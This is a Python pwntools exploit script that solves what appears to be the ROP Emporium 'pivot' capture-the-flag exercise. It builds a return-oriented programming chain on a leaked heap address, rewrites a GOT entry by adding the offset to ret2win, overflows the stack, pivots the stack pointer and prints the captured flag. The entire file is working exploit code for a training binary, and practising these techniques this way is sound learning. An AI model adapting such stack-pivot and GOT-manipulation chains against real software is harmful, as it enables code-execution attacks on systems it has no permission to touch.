from pwn import *

elf = ELF('pivot')
lib = ELF('libpivot.so')

gad_pop_rax = p64(0x4009bb)
gad_switch_rsp = p64(0x4009bd)

offset = p64(lib.symbols["ret2win"] - lib.symbols["foothold_function"])
log.info("got offset is %x" % u64(offset))
gad_pop_rax = p64(0x4009bb)
gad_foothold_func_got = p64(0x601040)
#  gad_foothold_func_got = elf.got["foothold_function"]
gad_mov_rax_from_rax = p64(0x4009c0)
gad_pop_rbp = p64(0x4007c8)
gad_rax_add_rbp = p64(0x4009c4)
gad_call_rax = p64(0x4006b0)

# find the heap addr
p = process(elf.path)

#  gdbscript = "b pwnme"
#  pid = gdb.attach(p, gdbscript=gdbscript)

response = p.recvuntil("Send a ROP")

#  print(response.decode())

flag = re.search("to pivot:\s+(0x.*)", response.decode())
if flag:
    log.info("addr found: %s" % flag.group(1))

data_heap_addr = int(flag.group(1), 16)
gad_data_heap_addr = p64(data_heap_addr)


gad_foothold_func_plt = p64(0x400720)
pay_heap = b''
# heap fill
# 1. call foothold_function once to fill .got
pay_heap += gad_foothold_func_plt

# 2. modify the .got of foothold_function by add the offset of ret2win to it.

pay_heap += gad_pop_rax + gad_foothold_func_got
pay_heap += gad_mov_rax_from_rax
pay_heap += gad_pop_rbp + offset
pay_heap += gad_rax_add_rbp

# 3. call ret2win
pay_heap += gad_call_rax

res = p.recvrepeat(0.2)
print(res.decode())
p.sendline(pay_heap)
log.info("heap fill sendout")


pay_stack = b'X'*40
# stack fill
# 1 switch esp
pay_stack += gad_pop_rax + gad_data_heap_addr
pay_stack += gad_switch_rsp

res = p.recvrepeat(0.2)
p.sendline(pay_stack)
log.info("stack fill sendout")
print(res.decode())


#  result = p.recvuntil("ROPE")
result = p.recvall()
print(result.decode())

flag = re.findall("ROPE{.*?}", result.decode())

if flag:
    #  print(flag[0])
    print("[-] Get flag!")
    success(flag[0])
